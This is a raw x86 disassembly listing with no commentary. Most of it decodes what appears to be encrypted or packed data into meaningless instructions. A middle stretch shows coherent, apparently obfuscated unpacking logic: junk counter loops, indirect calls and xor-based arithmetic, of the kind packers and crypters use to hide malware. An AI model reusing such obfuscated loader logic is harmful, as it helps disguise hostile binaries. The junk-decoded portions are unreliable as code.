  413115:	(bad)  
  413116:	push   edi
  413117:	stc    
  413118:	adc    dl,dh
  41311a:	mov    al,0x9d
  41311c:	or     esp,edx
  41311e:	mov    edx,DWORD PTR [edi-0x7f0c4c4]
  413124:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413125:	push   0x806d3ce
  41312a:	jecxz  0x41316f
  41312c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41312d:	xchg   edx,eax
  41312e:	mov    ah,0x15
  413130:	jmp    0x413102
  413132:	add    DWORD PTR [eax-0x1243f747],ebp
  413138:	pop    es
  413139:	dec    esp
  41313a:	pop    ds
  41313b:	xor    al,0x16
  41313d:	add    ah,ch
  41313f:	aad    0x85
  413141:	cmp    eax,0xb23b9179
  413146:	xor    esp,DWORD PTR [ecx+0x2a]
  413149:	or     bl,BYTE PTR [edx+0xd]
  41314c:	out    0x1e,al
  41314e:	in     eax,0xde
  413150:	lods   eax,DWORD PTR ds:[esi]
  413151:	pop    eax
  413152:	adc    BYTE PTR ds:0x761b2e7c,bl
  413158:	leave  
  413159:	fisubr WORD PTR [ecx+0x10065d3c]
  41315f:	les    ecx,FWORD PTR [ebx-0x4279a3d0]
  413165:	cs pop edi
  413167:	dec    ebp
  413168:	lods   eax,DWORD PTR ds:[esi]
  413169:	(bad)  
  41316a:	xchg   ecx,eax
  41316b:	or     BYTE PTR [ebx+0x5],cl
  41316e:	daa    
  41316f:	sar    BYTE PTR [esp+eax*4],cl
  413172:	xor    esp,DWORD PTR [edx-0x75e51db]
  413178:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413179:	or     BYTE PTR [ecx-0x30ae7ce0],0x5
  413180:	inc    edi
  413181:	xchg   BYTE PTR [edi-0x25035efd],bh
  413187:	into   
  413188:	call   0x84b76870
  41318d:	mov    ecx,0xbfb6dd9b
  413192:	push   0xffffffb0
  413194:	aad    0xa3
  413196:	retf   0x60a1
  413199:	imul   ebp,DWORD PTR [ebp+0x4b931f94],0x47
  4131a0:	dec    ebx
  4131a1:	loopne 0x413145
  4131a3:	mov    ah,0xb2
  4131a5:	loopne 0x4131be
  4131a7:	les    esi,FWORD PTR [esi+0x51]
  4131aa:	fild   DWORD PTR [ebp+0x63]
  4131ad:	or     bh,BYTE PTR [eax-0x672d9da2]
  4131b3:	pop    eax
  4131b4:	leavew 
  4131b6:	xchg   edx,eax
  4131b7:	sub    al,0xe3
  4131b9:	and    eax,0x60dc6a89
  4131be:	popf   
  4131bf:	(bad)  
  4131c0:	fwait
  4131c1:	hlt    
  4131c2:	adc    bh,BYTE PTR [eax]
  4131c4:	add    al,al
  4131c6:	sbb    BYTE PTR [ebx+0x16],bl
  4131c9:	iret   
  4131ca:	test   al,0x64
  4131cc:	mov    ss,WORD PTR [edx]
  4131ce:	jae    0x413205
  4131d0:	mov    BYTE PTR [edi+0x45],ch
  4131d3:	pop    ss
  4131d4:	out    0x96,eax
  4131d6:	jnp    0x413216
  4131d8:	popa   
  4131d9:	ficom  WORD PTR [ebx-0x2c]
  4131dc:	push   edi
  4131dd:	loop   0x41320d
  4131df:	mov    bl,0x60
  4131e1:	mov    al,0xc2
  4131e3:	dec    esi
  4131e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131e5:	rcr    BYTE PTR [eax+0x2442e4f4],1
  4131eb:	pop    eax
  4131ec:	dec    edx
  4131ed:	jnp    0x413193
  4131ef:	mov    dh,0x4
  4131f1:	pop    ecx
  4131f2:	retf   
  4131f3:	dec    ebp
  4131f4:	jmp    0xd3139d4f
  4131f9:	sti    
  4131fa:	dec    edx
  4131fb:	repz es fs mov esp,0xd61bc9cb
  413203:	add    al,0xb
  413205:	mov    cl,dh
  413207:	mov    DWORD PTR [eax-0x63],edi
  41320a:	xchg   DWORD PTR ds:0xa139d80b,esi
  413210:	stos   BYTE PTR es:[edi],al
  413211:	and    al,0x8e
  413213:	fisub  WORD PTR [ebx]
  413215:	bound  eax,QWORD PTR [edx]
  413217:	loopne 0x4131e9
  413219:	inc    ebx
  41321a:	adc    al,0xe1
  41321c:	add    dl,ch
  41321e:	shr    DWORD PTR [ebx],0xd3
  413221:	outs   dx,BYTE PTR ds:[esi]
  413222:	psubw  mm2,mm0
  413225:	pop    ebx
  413226:	leave  
  413227:	imul   edi,DWORD PTR ds:0xd824bc4b,0x6d3a9b43
  413231:	push   ss
  413232:	std    
  413233:	into   
  413234:	mov    cl,0xc5
  413236:	clc    
  413237:	and    al,bh
  413239:	ror    BYTE PTR [esi+eiz*1],0x14
  41323d:	sbb    eax,0xedb47230
  413242:	cmp    DWORD PTR [edi-0x31],esp
  413245:	adc    eax,0x79b22cfe
  41324a:	stc    
  41324b:	leave  
  41324c:	leave  
  41324d:	mov    bl,BYTE PTR [edx-0x47]
  413250:	xchg   BYTE PTR [ebx+0x705d9f7f],bh
  413256:	cmp    edi,DWORD PTR [eax]
  413258:	jne    0x413254
  41325a:	fist   WORD PTR [esi+0x32f558b2]
  413260:	jge    0x413255
  413262:	push   esi
  413263:	mov    ebx,0x3e26d27a
  413268:	mov    WORD PTR [ecx+edi*1-0x2ebac178],es
  41326f:	inc    edi
  413270:	ja     0x413233
  413272:	(bad)  
  413273:	sbb    eax,0x2e3ca7b6
  413278:	popf   
  413279:	or     al,bh
  41327b:	lea    edx,ds:0xedf9e710
  413281:	ins    DWORD PTR es:[edi],dx
  413282:	je     0x413239
  413284:	xor    dl,BYTE PTR [esi-0x61d4d2bd]
  41328a:	jp     0x41328f
  41328c:	gs je  0x4132aa
  41328f:	out    0x5f,eax
  413291:	add    al,0x8f
  413293:	sub    ebx,DWORD PTR [ebx-0x79b87e8d]
  413299:	cmp    DWORD PTR [esi-0xa],edx
  41329c:	dec    ecx
  41329d:	cmp    esp,DWORD PTR [esi]
  41329f:	adc    DWORD PTR [ecx-0x65],ebp
  4132a2:	inc    esi
  4132a3:	in     al,0x80
  4132a5:	div    BYTE PTR [ebx-0x76]
  4132a8:	inc    ebx
  4132a9:	jp     0x413230
  4132ab:	repnz mov bh,0xc4
  4132ae:	mov    ds:0x6f8d5e6a,eax
  4132b3:	popf   
  4132b4:	add    BYTE PTR [edx+eax*4-0xbe1d6af],ah
  4132bb:	sub    cl,bh
  4132bd:	fild   WORD PTR [edi+esi*8]
  4132c0:	into   
  4132c1:	and    ecx,DWORD PTR [ecx+0x3beb15af]
  4132c7:	ins    BYTE PTR es:[edi],dx
  4132c8:	es jbe 0x4132cd
  4132cb:	test   BYTE PTR [ecx-0xe195cef],0x91
  4132d2:	popf   
  4132d3:	scas   eax,DWORD PTR es:[edi]
  4132d4:	and    DWORD PTR [edx-0x55524e85],0xa0ae7c20
  4132de:	ds xchg ebx,eax
  4132e0:	in     eax,0xff
  4132e2:	mov    eax,ds:0xed044747
  4132e7:	daa    
  4132e8:	test   BYTE PTR [eax-0x67d25ecf],dh
  4132ee:	pop    esp
  4132ef:	repz push esp
  4132f1:	jmp    0xe687:0xf10b65a4
  4132f8:	lods   al,BYTE PTR ds:[esi]
  4132f9:	imul   eax,DWORD PTR [ecx-0x107ed1ac],0x54
  413300:	aaa    
  413301:	lahf   
  413302:	sub    BYTE PTR ds:0x96ab39,0x62
  413309:	sub    eax,0xbba9447c
  41330e:	sub    al,0x1a
  413310:	ja     0x41332a
  413312:	in     eax,dx
  413313:	(bad)  
  413314:	ds push eax
  413316:	loop   0x4132c9
  413318:	adc    ah,bh
  41331a:	test   eax,0x1695a85c
  41331f:	test   eax,0x4799d304
  413324:	sbb    DWORD PTR [ebx+edi*1],esi
  413327:	jbe    0x413331
  413329:	jno    0x4132ad
  41332b:	cld    
  41332c:	xor    BYTE PTR [ebx],ch
  41332e:	adc    al,0x50
  413330:	cmp    ecx,DWORD PTR [esi-0x3]
  413333:	fcmovnbe st,st(1)
  413335:	sub    dh,bl
  413337:	or     al,0xd0
  413339:	pop    ebp
  41333a:	pop    edx
  41333b:	(bad)  [ebx]
  41333d:	mov    DWORD PTR [edx],ecx
  41333f:	mov    DWORD PTR ds:0x420e8e,0x16
  413349:	cmp    DWORD PTR ds:0x420e8e,0x0
  413350:	je     0x4133a5
  413356:	cmp    DWORD PTR ds:0x420e8e,0x2
  41335d:	jne    0x413373
  413363:	push   0x4d61
  413368:	push   0x424000
  41336d:	call   DWORD PTR ds:0x4247fd
  413373:	cmp    DWORD PTR ds:0x420e8e,0x3
  41337a:	jne    0x41338d
  413380:	mov    ecx,DWORD PTR ds:0x420e8e
  413386:	dec    ecx
  413387:	mov    DWORD PTR ds:0x420e8e,ecx
  41338d:	mov    ecx,DWORD PTR ds:0x420e8e
  413393:	dec    ecx
  413394:	mov    DWORD PTR ds:0x420e8e,ecx
  41339a:	jmp    0x413349
  41339f:	sbb    ecx,0x253c
  4133a5:	mov    ecx,DWORD PTR [ebp-0x14]
  4133a8:	and    DWORD PTR ds:0x42201c,0x420efc
  4133b2:	xor    ecx,eax
  4133b4:	adc    DWORD PTR ds:0x420f70,0x420ef8
  4133be:	add    ecx,esi
  4133c0:	mov    DWORD PTR [ebp-0x20],ecx
  4133c3:	mov    DWORD PTR [ebp+0x8],0xf89c85b5
  4133ca:	mov    ecx,DWORD PTR ds:0x420eec
  4133d0:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  4133d7:	mov    DWORD PTR [ebp-0x1c],0xf89c95b5
  4133de:	mov    ecx,0x748f
  4133e3:	mov    ecx,DWORD PTR [ebp-0xc]
  4133e6:	mov    DWORD PTR [ebp+0x8],ecx
  4133e9:	mov    DWORD PTR ds:0x420f68,0x5b27
  4133f3:	jmp    0x413647
  4133f8:	xor    DWORD PTR ds:0x422008,edx
  4133fe:	mov    ecx,DWORD PTR [ebp+0x8]
  413401:	sub    DWORD PTR ds:0x420fa8,0x420ef8
  41340b:	mov    edx,DWORD PTR [ebp-0x8]
  41340e:	sub    DWORD PTR ds:0x420e86,0x420f98
  413418:	xor    ecx,eax
  41341a:	sbb    DWORD PTR ds:0x420f60,0x61d9
  413424:	xor    edx,eax
  413426:	xor    DWORD PTR ds:0x420f04,0x2d2e
  413430:	sub    ecx,edx
  413432:	sub    ecx,esi
  413434:	xor    ecx,eax
  413436:	and    DWORD PTR ds:0x420e9e,0x0
  413440:	mov    edx,DWORD PTR ds:0x420e9e
  413446:	inc    edx
  413447:	mov    DWORD PTR ds:0x420e9e,edx
  41344d:	cmp    DWORD PTR ds:0x420e9e,0x5
  413454:	jne    0x41346d
  41345a:	push   0x4241e6
  41345f:	push   0x1
  413461:	push   DWORD PTR [ebp-0x10]
  413464:	push   DWORD PTR [ebp-0x28]
  413467:	call   DWORD PTR ds:0x424801
  41346d:	cmp    DWORD PTR ds:0x420e9e,0x4
  413474:	jne    0x413487
  41347a:	mov    edx,DWORD PTR ds:0x420e9e
  413480:	inc    edx
  413481:	mov    DWORD PTR ds:0x420e9e,edx
  413487:	cmp    DWORD PTR ds:0x420e9e,0x18
  41348e:	jb     0x413440
  413494:	mov    DWORD PTR [ebp+0x8],ecx
  413497:	dec    edx
  413498:	mov    ecx,DWORD PTR [ebp+0x8]
  41349b:	add    edx,DWORD PTR ds:0x420e92
  4134a1:	mov    edx,DWORD PTR [ebp-0x64]
  4134a4:	add    DWORD PTR ds:0x420fa8,0x502e
  4134ae:	lea    ecx,[edx+ecx*1+0x5708f2]
  4134b5:	and    DWORD PTR ds:0x420f64,0x0
  4134bf:	mov    edx,DWORD PTR ds:0x420f64
  4134c5:	inc    edx
  4134c6:	mov    DWORD PTR ds:0x420f64,edx
  4134cc:	cmp    DWORD PTR ds:0x420f64,0x1a
  4134d3:	jne    0x4134e7
  4134d9:	push   0x420f04
  4134de:	push   DWORD PTR [ebp-0x24]
  4134e1:	call   DWORD PTR ds:0x424805
  4134e7:	cmp    DWORD PTR ds:0x420f64,0x15
  4134ee:	jb     0x4134bf
  4134f4:	or     DWORD PTR ds:0x422008,0x1488
  4134fe:	mov    DWORD PTR [ebp-0x64],ecx
  413501:	mov    ecx,DWORD PTR [ebp+0x8]
  413504:	mov    edx,DWORD PTR [ebp-0x60]
  413507:	lea    ecx,[edx+ecx*1+0x5708f2]
  41350e:	mov    DWORD PTR [ebp-0x60],ecx
  413511:	mov    ecx,DWORD PTR [ebp+0x8]
  413514:	mov    edx,DWORD PTR ds:0x422000
  41351a:	adc    DWORD PTR ds:0x420fa4,edx
  413520:	mov    edx,DWORD PTR [ebp-0x5c]
  413523:	sbb    DWORD PTR ds:0x420fa4,0x6605
  41352d:	lea    ecx,[edx+ecx*1+0x5708f3]
  413534:	and    DWORD PTR ds:0x420f5c,0x0
  41353e:	jmp    0x413552
  413543:	xor    edx,edx
  413545:	xor    edx,DWORD PTR ds:0x420f5c
  41354b:	inc    edx
  41354c:	mov    DWORD PTR ds:0x420f5c,edx
  413552:	cmp    DWORD PTR ds:0x420f5c,0x13
  413559:	jae    0x4135ab
  41355f:	cmp    DWORD PTR ds:0x420f5c,0x5
  413566:	jne    0x41358a
  41356c:	push   DWORD PTR [ebp-0x20]
  41356f:	push   0x420f04
  413574:	push   DWORD PTR [ebp-0x20]
  413577:	push   0x4240b9
  41357c:	push   0x1238
  413581:	push   DWORD PTR [ebp-0xc]
  413584:	call   DWORD PTR ds:0x42480d
  41358a:	cmp    DWORD PTR ds:0x420f5c,0x4
  413591:	jne    0x4135a4
  413597:	mov    edx,DWORD PTR ds:0x420f5c
  41359d:	inc    edx
  41359e:	mov    DWORD PTR ds:0x420f5c,edx
  4135a4:	jmp    0x413543
  4135a9:	neg    edx
  4135ab:	mov    DWORD PTR [ebp-0x5c],ecx
  4135ae:	and    DWORD PTR ds:0x420fa4,0x0
  4135b8:	mov    edx,DWORD PTR ds:0x420fa4
  4135be:	inc    edx
  4135bf:	mov    DWORD PTR ds:0x420fa4,edx
  4135c5:	cmp    DWORD PTR ds:0x420fa4,0x20
  4135cc:	jne    0x4135d8
  4135d2:	call   DWORD PTR ds:0x424811
  4135d8:	cmp    DWORD PTR ds:0x420fa4,0x18
  4135df:	jb     0x4135b8
  4135e5:	adc    edx,0x1b19
  4135eb:	mov    ecx,DWORD PTR [ebp+0x8]
  4135ee:	mov    edx,DWORD PTR [ebp-0x58]
  4135f1:	lea    ecx,[edx+ecx*1+0x5708f0]
  4135f8:	xor    edx,DWORD PTR ds:0x420f08
  4135fe:	mov    DWORD PTR [ebp-0x58],ecx
  413601:	mov    ecx,DWORD PTR [ebp+0x8]
  413604:	xor    DWORD PTR ds:0x420f64,0x420eec
  41360e:	mov    edx,DWORD PTR [ebp-0x54]
  413611:	lea    ecx,[edx+ecx*1+0x5708f1]
  413618:	add    DWORD PTR ds:0x420f08,ebx
  41361e:	mov    DWORD PTR [ebp-0x54],ecx
  413621:	or     ecx,DWORD PTR ds:0x422018
  413627:	mov    ecx,DWORD PTR [ebp+0x8]
  41362a:	mov    edx,DWORD PTR [ebp-0x50]
  41362d:	inc    DWORD PTR ds:0x420f00
  413633:	lea    ecx,[edx+ecx*1+0x5708fe]
  41363a:	and    DWORD PTR ds:0x420e9a,0x420f6c
  413644:	mov    DWORD PTR [ebp-0x50],ecx
  413647:	inc    ecx
  413648:	mov    ecx,DWORD PTR [ebp+0x8]
  41364b:	adc    DWORD PTR ds:0x420ea2,0x68a
  413655:	xor    ecx,eax
  413657:	and    DWORD PTR ds:0x420e8e,0x1a66
  413661:	add    ecx,esi
  413663:	mov    DWORD PTR ds:0x420e92,0x4bef
  41366d:	jne    0x4133f8
  413673:	jmp    0x420dd1
  413678:	mov    ecx,DWORD PTR [ebp-0x1c]
  41367b:	mov    edx,DWORD PTR ds:0x423008
  413681:	mov    edx,DWORD PTR [edx]
  413683:	sub    DWORD PTR ds:0x420fb4,edx
  413689:	mov    edx,DWORD PTR [ebp-0x8]
  41368c:	xor    DWORD PTR ds:0x420f04,0x3196
  413696:	xor    ecx,eax
  413698:	xor    edx,eax
  41369a:	sbb    DWORD PTR ds:0x422000,0x24d3
  4136a4:	sub    ecx,edx
  4136a6:	xor    DWORD PTR ds:0x420e82,0x420e8a
  4136b0:	sub    ecx,esi
  4136b2:	xor    ecx,eax
  4136b4:	mov    DWORD PTR [ebp-0x1c],ecx
  4136b7:	mov    ecx,DWORD PTR [ebp-0xc]
  4136ba:	mov    DWORD PTR [ebp+0x8],ecx
  4136bd:	jmp    0x4136ef
  4136c2:	mov    ecx,DWORD PTR [ebp+0x8]
  4136c5:	mov    edx,DWORD PTR [ebp-0x8]
  4136c8:	xor    ecx,eax
  4136ca:	xor    edx,eax
  4136cc:	sub    ecx,edx
  4136ce:	sub    ecx,esi
  4136d0:	xor    ecx,eax
  4136d2:	mov    DWORD PTR [ebp+0x8],ecx
  4136d5:	mov    ecx,DWORD PTR [ebp+0x8]
  4136d8:	mov    edx,DWORD PTR [ebp+0x8]
  4136db:	imul   edx,edx,0x5708f2
  4136e1:	xor    ecx,eax
  4136e3:	add    ecx,esi
  4136e5:	lea    ecx,[ebp+ecx*4-0x64]
  4136e9:	mov    edi,DWORD PTR [ecx]
  4136eb:	add    edx,edi
  4136ed:	mov    DWORD PTR [ecx],edx
  4136ef:	mov    ecx,DWORD PTR [ebp+0x8]
  4136f2:	xor    ecx,eax
  4136f4:	jmp    0x415a81
  4136f9:	js     0x4136a4
  4136fb:	inc    edx
  4136fc:	iret   
  4136fd:	aaa    
  4136fe:	jae    0x41377b
  413700:	test   eax,0x7e5a8e7d
  413705:	(bad)  
  413706:	jnp    0x413736
  413708:	mov    bh,BYTE PTR [esi+0xa7a7a73]
  41370e:	pop    edi
  41370f:	jp     0x41378b
  413711:	cmp    ecx,DWORD PTR [ecx-0x5a]
  413714:	inc    edi
  413715:	rcr    cl,cl
  413717:	mov    DWORD PTR [ebx+0x0],ebp
  41371a:	jl     0x4136a2
  41371c:	mov    ebx,0x8c98b1b2
  413721:	bound  edi,QWORD PTR [edi+0x7f27d50c]
  413727:	fnstenv [ecx+0x64]
  41372a:	fst    QWORD PTR [esi]
  41372c:	mov    BYTE PTR [esi-0x49c272bf],cl
  413732:	dec    esi
  413733:	call   0xba8b:0xc9c8cc25
  41373a:	push   cs
  41373b:	pusha  
  41373c:	xor    edi,DWORD PTR ds:0xe81ec346
  413742:	pushf  
  413743:	mov    BYTE PTR ds:0x4137fdb6,bh
  413749:	mov    cl,0x4a
  41374b:	sub    eax,0x442b6536
  413750:	ret    0x4ff2
  413753:	push   ss
  413754:	repnz sbb BYTE PTR [esi+0xd1191d1],al
  41375b:	mov    BYTE PTR [eax+0x59c63cc3],ch
  413761:	push   0xffffffaa
  413763:	sub    BYTE PTR [edx-0x59],bh
  413766:	(bad)  
  413768:	test   eax,0xab0b60be
  41376d:	mov    al,0x8
  41376f:	push   0xd1f326bd
  413774:	inc    ebx
  413775:	cdq    
  413776:	popf   
  413777:	mov    ah,0x35
  413779:	shr    DWORD PTR [ebx+0x25],1
  41377c:	into   
  41377d:	nop
  41377e:	cmp    eax,0xb5c669ef
  413783:	lea    esp,[edx]
  413785:	enter  0x6925,0xbf
  413789:	pop    edx
  41378a:	(bad)  
  41378b:	stc    
  41378c:	pushw  ss
  41378e:	pop    ecx
  41378f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413790:	test   BYTE PTR [edx-0x51379ca6],cl
  413796:	stos   DWORD PTR es:[edi],eax
  413797:	sub    DWORD PTR [ecx],ebx
  413799:	das    
  41379a:	mov    al,ds:0xdbe4024f
  41379f:	sbb    bl,bl
  4137a1:	jp     0x413742
  4137a3:	fwait
  4137a4:	imul   edi,DWORD PTR [ebx],0xd1dff6d7
  4137aa:	mov    ebx,0x386e0041
  4137af:	xchg   BYTE PTR [ebp+0x4f5f27af],ah
  4137b5:	add    BYTE PTR [edx],dl
  4137b7:	pop    ds
  4137b8:	push   ss
  4137b9:	push   esp
  4137ba:	aad    0x51
  4137bc:	in     eax,0x22
  4137be:	test   DWORD PTR [edi-0x38],0x3683e6f6
  4137c5:	pop    ecx
  4137c6:	cmp    BYTE PTR [esi-0x7],al
  4137c9:	leave  
  4137ca:	cmp    esi,DWORD PTR [ebp+0x73]
  4137cd:	inc    ebp
  4137ce:	pop    ecx
  4137cf:	aas    
  4137d0:	push   ebx
  4137d1:	in     eax,0xee
  4137d3:	imul   ebp,DWORD PTR [esi],0xffffffb1
  4137d6:	(bad)  
  4137d7:	scas   eax,DWORD PTR es:[edi]
  4137d8:	inc    ecx
  4137d9:	in     al,dx
  4137da:	pop    es
  4137db:	xor    BYTE PTR [ecx+0x27],ah
  4137de:	imul   edx,DWORD PTR ds:0xd7423a07,0x3af22158
  4137e8:	jb     0x413817
  4137ea:	push   0x79
  4137ec:	jp     0x413771
  4137ee:	fmulp  st(7),st
  4137f0:	mov    ah,0x6
  4137f2:	mov    edi,esp
  4137f4:	pop    esp
  4137f5:	mov    ebp,0xdacfa366
  4137fa:	sbb    edi,DWORD PTR [edx+0x6f]
  4137fd:	fisubr WORD PTR [edi+0x7cd922b8]
  413803:	out    0x65,eax
  413805:	rcl    DWORD PTR [ebp+0x62],1
  413808:	mov    ds:0xfa3ae76d,eax
  41380d:	xor    eax,0xb529f211
  413812:	cli    
  413813:	cs sahf 
  413815:	in     eax,dx
  413816:	dec    esp
  413817:	sbb    BYTE PTR [eax+0x2005aa38],0xb2
  41381e:	mov    WORD PTR [ecx],?
  413820:	ds (bad) 
  413822:	repz inc ebp
  413824:	push   eax
  413825:	dec    esi
  413826:	mov    ebx,DWORD PTR [edx-0x44]
  413829:	xchg   ebx,eax
  41382a:	ret    0xbbc9
  41382d:	adc    BYTE PTR [eax+edx*2-0x3f],bh
  413831:	cmp    bl,dh
  413833:	ins    DWORD PTR es:[edi],dx
  413834:	out    dx,al
  413835:	fisttp WORD PTR [esi+0x246e63d5]
  41383b:	push   ebp
  41383c:	retf   0x421c
  41383f:	(bad)  
  413840:	(bad)  [ecx-0xc]
  413843:	and    ch,BYTE PTR [ecx-0x55]
  413846:	dec    edx
  413847:	in     al,0xa5
  413849:	mov    ebp,0x911d460e
  41384e:	mov    bh,BYTE PTR [edi]
  413850:	scas   eax,DWORD PTR es:[edi]
  413851:	into   
  413852:	xor    cl,BYTE PTR [ecx+0x30]
  413855:	ret    0x720d
  413858:	fst    DWORD PTR ds:0x4293a366
  41385e:	les    ecx,FWORD PTR [edx]
  413860:	mov    bl,0x7
  413862:	push   es
  413863:	js     0x413866
  413865:	fiadd  DWORD PTR [ebp+0x7f323297]
  41386b:	jl     0x413866
  41386d:	mov    edx,0x481e4fcf
  413872:	sub    al,0xe0
  413874:	iret   
  413875:	push   ecx
  413876:	test   BYTE PTR [edi+esi*2+0x1a],ch
  41387a:	and    BYTE PTR [ebp+0x2f061142],ch
  413880:	xchg   bl,dh
  413882:	pop    esi
  413883:	imul   ebp,DWORD PTR [edi],0x4e
  413886:	jns    0x4138f2
  413888:	(bad)  
  413889:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41388a:	dec    ecx
  41388b:	xchg   bh,cl
  41388d:	or     al,cl
  41388f:	(bad)  
  413891:	and    eax,0xf1e201e8
  413896:	and    DWORD PTR [ebx-0x4b],0xbb3b7422
  41389d:	ds mov ch,0xf3
  4138a0:	retf   
  4138a1:	pusha  
  4138a2:	mov    esi,0xb84b0c9
  4138a7:	pusha  
  4138a8:	imul   ebp,DWORD PTR [esi],0xffffffb2
  4138ab:	xor    edi,0x5b769780
  4138b1:	loope  0x4138d9
  4138b3:	retf   0x93d1
  4138b6:	sbb    BYTE PTR [edi+ebx*1+0x3b74c00a],0xf3
  4138be:	mov    ecx,0xf03b412d
  4138c3:	sar    esi,1
  4138c5:	sub    BYTE PTR ds:0xf98d7398,al
  4138cb:	pusha  
  4138cc:	dec    ebx
  4138cd:	fwait
  4138ce:	mov    ds:0xe0eacacc,al
  4138d3:	add    BYTE PTR [esi-0x71],bh
  4138d6:	mov    eax,ds:0xb42d33aa
  4138db:	inc    edx
  4138dc:	test   DWORD PTR [ebp-0x32],ecx
  4138df:	mov    dh,0x81
  4138e1:	mov    fs,esp
  4138e3:	shl    DWORD PTR [ecx+0x51],cl
  4138e6:	jo     0x413905
  4138e8:	call   0x1cfac261
  4138ed:	jne    0x41394c
  4138ef:	jmp    0x20b1:0xdd76708
  4138f6:	pop    ds
  4138f7:	neg    DWORD PTR [eax-0x6186a67]
  4138fd:	sbb    DWORD PTR [edi+0x43d88b3d],eax
  413903:	arpl   WORD PTR ds:0xcd3c6e98,bp
  413909:	and    BYTE PTR [ebp-0x79f59894],al
  41390f:	jmp    0x43e1a6c2
  413914:	fld    QWORD PTR [edi]
  413916:	dec    esp
  413917:	mov    edi,0x3ff9ab1b
  41391c:	mov    cl,0xd9
  41391e:	jno    0x413922
  413920:	lods   eax,DWORD PTR ds:[esi]
  413921:	outs   dx,BYTE PTR ds:[esi]
  413922:	sbb    al,0x81
  413924:	test   DWORD PTR [edx*4-0x6d2d8fd4],esp
  41392b:	pusha  
  41392c:	in     al,dx
  41392d:	push   ds
  41392e:	out    dx,eax
  41392f:	rcl    BYTE PTR ds:0x749d2989,1
  413935:	or     al,0x26
  413937:	cli    
  413938:	in     al,dx
  413939:	cdq    
  41393a:	clc    
  41393b:	(bad)  [ecx]
  41393d:	and    al,BYTE PTR [edi+0x7]
  413940:	jbe    0x413923
  413942:	mov    dh,0xa9
  413944:	ret    0xfa8b
  413947:	push   ebx
  413948:	fsubr  DWORD PTR [eax-0x73]
  41394b:	test   BYTE PTR [edx-0x7d],ch
  41394e:	(bad)  
  41394f:	sti    
  413950:	daa    
  413951:	dec    esp
  413952:	jle    0x4139ad
  413954:	dec    edx
  413955:	add    al,0x8a
  413957:	adc    eax,0xea8abc52
  41395c:	and    esp,DWORD PTR [esi-0x66886414]
  413962:	shl    bl,1
  413964:	inc    eax
  413965:	out    dx,eax
  413966:	add    eax,0x5dbbd188
  41396b:	fisubr WORD PTR [ebx-0x5eff1a58]
  413971:	cs inc esp
  413973:	and    edx,esp
  413975:	mov    esi,0x3db1d138
  41397a:	mov    dl,0xbd
  41397c:	add    eax,0xf3b6244f
  413981:	jmp    0x2399dba4
  413986:	sbb    al,0xf0
  413988:	stos   BYTE PTR es:[edi],al
  413989:	cmc    
  41398a:	dec    ebx
  41398b:	fld    st(2)
  41398d:	inc    eax
  41398e:	mov    edi,0x31650804
  413993:	fiadd  DWORD PTR [ebx+0x563c9c94]
  413999:	lahf   
  41399a:	cmp    esp,DWORD PTR [ecx]
  41399c:	cmp    eax,0xf8d004a0
  4139a1:	in     al,0x79
  4139a3:	xor    bl,al
  4139a5:	jp     0x413976
  4139a7:	dec    ebp
  4139a8:	not    BYTE PTR [esi]
  4139aa:	jecxz  0x413975
  4139ac:	loop   0x4139fb
  4139ae:	xor    DWORD PTR [eax+0x79],0x4c
  4139b2:	sub    eax,0xccc8f986
  4139b7:	push   esp
  4139b8:	push   es
  4139b9:	push   es
  4139ba:	adc    al,0xb5
  4139bc:	mov    eax,0x1fb4ad84
  4139c1:	(bad)  
  4139c2:	int3   
  4139c3:	fidiv  WORD PTR [esi-0x533786af]
  4139c9:	sbb    DWORD PTR [esp+edx*8],ebp
  4139cc:	push   edx
  4139cd:	dec    ebp
  4139ce:	aas    
  4139cf:	xor    eax,0xd75229af
  4139d4:	test   BYTE PTR [edi],ah
  4139d6:	add    al,0xf5
  4139d8:	jmp    0x1015:0xcbe9ed2e
  4139df:	xor    ah,dh
  4139e1:	out    dx,al
  4139e2:	rcl    bl,1
  4139e4:	pop    ss
  4139e5:	das    
  4139e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4139e7:	xchg   ah,cl
  4139e9:	in     eax,dx
  4139ea:	jno    0x413a5b
  4139ec:	jno    0x4139b0
  4139ee:	push   ss
  4139ef:	push   ecx
  4139f0:	push   0xf2b5c862
  4139f5:	rol    DWORD PTR [ecx+eax*4-0x681aaef7],cl
  4139fc:	mov    dh,0xe1
  4139fe:	sbb    eax,0x62097e0a
  413a03:	mov    ch,0x8c
  413a05:	mov    eax,0xabea1c2c
  413a0a:	jo     0x413a6b
  413a0c:	mov    esp,0x38890355
  413a11:	push   es
  413a12:	fsub   DWORD PTR [ecx-0x20f15a7c]
  413a18:	aam    0x6d
  413a1a:	loopne 0x413a5c
  413a1c:	stos   BYTE PTR es:[edi],al
  413a1d:	pusha  
  413a1e:	pop    eax
  413a1f:	in     eax,0x77
  413a21:	mov    eax,ds:0xcbb03e42
  413a26:	into   
  413a27:	or     al,0x71
  413a29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a2a:	fld    DWORD PTR [edx+0x63]
  413a2d:	ficom  WORD PTR [edx-0x63]
  413a30:	inc    eax
  413a31:	(bad)  
  413a32:	ins    DWORD PTR es:[edi],dx
  413a33:	scas   al,BYTE PTR es:[edi]
  413a34:	pop    ebp
  413a35:	inc    ebp
  413a36:	inc    esi
  413a37:	xchg   esp,eax
  413a38:	(bad)  
  413a3a:	cmp    esp,DWORD PTR [esi+0x1101c128]
  413a40:	ins    DWORD PTR es:[edi],dx
  413a41:	inc    edx
  413a42:	stos   DWORD PTR es:[edi],eax
  413a43:	xor    eax,DWORD PTR ds:0x345502e2
  413a49:	sbb    eax,esi
  413a4b:	adc    eax,0xb09b91d8
  413a50:	mov    cl,0xd2
  413a52:	xchg   edx,eax
  413a53:	and    eax,0xd3c894eb
  413a58:	adc    ch,BYTE PTR [edx]
  413a5a:	dec    ebp
  413a5b:	mov    ds:0xcaa64ca3,al
  413a60:	ss mov dh,0xa4
  413a63:	push   ss
  413a64:	adc    cl,dl
  413a66:	imul   edx,DWORD PTR [ebp+0x7d56499d],0xfb282421
  413a70:	jno    0x413ab8
  413a72:	int3   
  413a73:	pop    esp
  413a74:	inc    ebp
